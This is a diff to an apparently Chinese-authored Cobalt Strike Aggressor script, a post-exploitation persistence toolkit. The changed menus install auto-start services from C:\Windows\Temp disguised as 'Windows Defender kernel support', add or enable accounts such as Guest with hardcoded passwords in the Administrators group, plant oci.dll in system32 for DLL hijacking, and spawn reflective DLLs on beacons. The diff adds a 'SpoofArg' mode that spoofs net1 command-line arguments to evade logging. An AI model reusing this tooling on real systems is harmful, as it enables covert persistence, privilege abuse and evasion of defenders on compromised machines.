@@ -201,8 +201,8 @@ menu "系统服务" {
 	item "添加服务" {
 		local('$bid');
 		foreach $bid ($1){
-			$filePath = "C:\\windows\\Temp\\".randomFileName().".exe";
-			$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName() , displayname => "1_".randomFileName() , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "自启动",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName().".exe",setsddl => "显示服务", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
+			$filePath = "C:\\windows\\Temp\\".randomFileName(6).".exe";
+			$Dialog = dialog("Servers Auto Run",%(servicename => "1_".randomFileName(6) , displayname => "1_".randomFileName(6) , binpath => "$filePath" ,description => "Windows Defender kernel support.",stype => "自启动",bid => $bid,serviceFile => "C:\\windows\\Temp\\Service_".randomFileName(6).".exe",setsddl => "显示服务", evilFile => "" , cmdline => "CMD /c ".$filePath , addtype => "API"),&InstallAutoService);
 			dialog_description($Dialog, "添加服务,如果是非服务的程序需要使用:cmd /c start xxx 或者 rundll32 xxx.dll;服务程序用来接受SCM的控制,提供了两个服务程序，一个为正常启动的服务用于执行载荷；另一个只会返回失败，用来作为启动失败回调的服务。");
 			drow_text($Dialog, "servicename", "服务名称: ");
 			drow_text($Dialog, "serviceFile", "服务程序: ");
@@ -335,17 +335,19 @@ menu "用户操作" {
 	item "添加用户" {
 		local('$bid');
 		foreach $bid ($1){
-			$Dialog = dialog("添加新用户到组",%(user => "xasda",pass => "Yanghao@123",localgroups => "Administrators",comment => "我爱雨夜花",addtype => "API",bid => $bid),&AdUser);
+			$Dialog = dialog("添加新用户到组",%(user => "xasda",pass => "Yanghao@123",localgroups => "Administrators",comment => "",addtype => "API",bid => $bid),&AdUser);
 			dialog_description($Dialog, "添加用户，密码中不要包含\$，否则容易出bug.");
 			drow_text($Dialog, "user", "账户名称: ");
 			drow_text($Dialog, "pass", "账户密码: ");
 			drow_text($Dialog, "comment", "账户描述: ");
 			drow_combobox($Dialog, "localgroups", "加入的组: ", @("Administrators","Remote Desktop Users","Users","Guests"));  # net localgroup
-			drow_combobox($Dialog, "addtype", "添加方式: ", @("NET","API"));
+			drow_combobox($Dialog, "addtype", "添加方式: ", @("NET","API","SpoofArg"));
 			dbutton_action($Dialog, "AdUser");
 			dialog_show($Dialog);
 		}
 	}
+	
+	
 	
 	item "克隆用户" {
 		local('$bid');
@@ -375,7 +377,7 @@ menu "用户操作" {
 	item "修改账户" {
 		local('$bid');
 		foreach $bid ($1){
-			$Dialog = dialog("修改账户",%(user => "Guest",pass => "Yanghao@123$",comment => "供来宾访问计算机或访问域的内置帐户",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
+			$Dialog = dialog("修改账户",%(user => "Guest",pass => "Yanghao@123$",comment => "",localgroups => "Administrators",addtype => "NET",DoFt => "enable",bid => $bid),&ChangeAccount);
 			dialog_description($Dialog, "1(enable).激活账户后设置密码并加入组（如果账户不存在会失败,存在的账户描述信息不会被修改）;2(disabled).移除用户组,禁用用户;3(移除组).从特定组中移除账户。注意:Win10激活Guest无法直接用于登录。");
 			drow_text($Dialog, "user", "账户名称: ");
 			drow_text($Dialog, "pass", "账户密码: ");
@@ -464,7 +466,7 @@ sub StartUp{
 		sleep(3000);
 		blog($bid,"Done.");
 	}else if($Type eq "API重启写入"){		
-		$TempFile = "C:\\Windows\\Temp\\".randomFileName().".exe";
+		$TempFile = "C:\\Windows\\Temp\\".randomFileName(6).".exe";
 		blog($bid,"Upload $PersistentFile To $TempFile");
 		bupload_raw($bid, $TempFile, readb(openf($PersistentFile), -1));
 		blog($bid,"Sleep 3s");
@@ -877,7 +879,7 @@ menu "DLL加载"{
 					sleep(3000);
 					
 					$NewFile = "C:\\windows\\system32\\oci.dll";
-					$TempFile = "C:\\Windows\\Temp\\".randomFileName();
+					$TempFile = "C:\\Windows\\Temp\\".randomFileName(6);
 					blog($bid,"Upload ".$ociFile." to $TempFile ");	
 					$handle = openf($ociFile);
 					$bdata   = readb($handle, -1);
@@ -1965,7 +1967,7 @@ sub ChangeAccount{
 	$groups = $3['localgroups'];
 	$tmp = replace($3['comment'],' ','');
 	$tmp = replace($tmp,'|','');
-	$comment = URLencode($tmp); #账户描述 
+	
 	$Type = $3['addtype'];   #API NET 
 	$Do = $3['DoFt'];        #禁用 、启用、删除组用户
 	#启用
@@ -1981,7 +1983,13 @@ sub ChangeAccount{
 			# Guest,1,administrators,password  启用Guest,加入管理组,设置密码
 			
 			blog($bid, "Use API to Enable account $User");
-			$Parameter = "EnableAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".$comment;
+			if($comment eq ""){
+				$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
+			}else{
+				$comment = URLencode($tmp); #账户描述 
+				$Parameter = "ChangeAccount" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".$comment;
+			}
+
 			blog($bid, "$Parameter");
 			bdllspawn!($bid, getFileProper(script_resource("Persistence/modules"), "/Netapi32/reflective_dll.dll"),$Parameter, "enable account", 5000);	
 		}else{
@@ -2022,7 +2030,7 @@ sub ChangeAccount{
 }
 
 sub AdUser{
-	local('$User $Pwd $groups $bid $Type $Parameter $comment $tmp');
+	local('$User $Pwd $groups $bid $Type $Parameter $comment $tmp $length1 $length2 $cmd1 $cmd2');
 	$bid = $3['bid'];
 	$User = $3['user'];
 	$Pwd = $3['pass'];
@@ -2036,12 +2044,30 @@ sub AdUser{
 		bshell($bid, "net1 localgroup $groups $User /add");
 	}
 	else if($Type eq "API"){
-		$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".URLencode($comment);
+		if($comment eq ""){
+			$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|0000";
+		}else{
+			$Parameter = "AddUser" . "|" . $User . "|" . $Pwd  . "|" .$groups."|".URLencode($comment);
+		}
 		blog($bid,"$Parameter");
 		bdllspawn!($bid, getFileProper("D:\\ActivePart\\Code\\VS2019\\DLL\\0x02_ReflectiveDLL\\CobaltStrike_script\\Persistence\\UserAPI\\Release\\reflective_dll.dll"),$Parameter, "AdUser", 5000);	
 		
-	}else{
-
+	}else if ($Type eq "SpoofArg"){
+		$cmd1 = "net1 user $User $Pwd /add";
+		$cmd2 = "net1 localgroup $groups $User /add";
+		blog($bid, "$cmd1");
+		blog($bid, "$cmd2");
+		$length1 = strlen($cmd1);
+		$length2 = strlen($cmd2);
+		if($length1  > $length2) {
+			bargue_add($bid, "net1", randomFileName($length1));
+		}
+		else{
+			bargue_add($bid, "net1", randomFileName($length2));
+		}
+		brun($bid, $cmd1);
+		brun($bid, $cmd2);
+		bargue_remove($bid, "net1");
 	}
 }
 
@@ -2101,13 +2127,15 @@ sub URLDecoder{
 }
 
 sub randomFileName{
+	local('$int');
+	$int = $1;
 	$str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
 	$random = [new Random];
 	$filenameRand = [new StringBuffer];
-	for ($x = 0; $x < 6; $x++)
+	for ($x = 0; $x < $int; $x++)
 		{
 			$number = [$random nextInt:int(strlen($str))]; #随机数
-			println($number);
+			# println($number);
 			$char = charAt($str, $number);
 			[$filenameRand append: $char ];
 		}
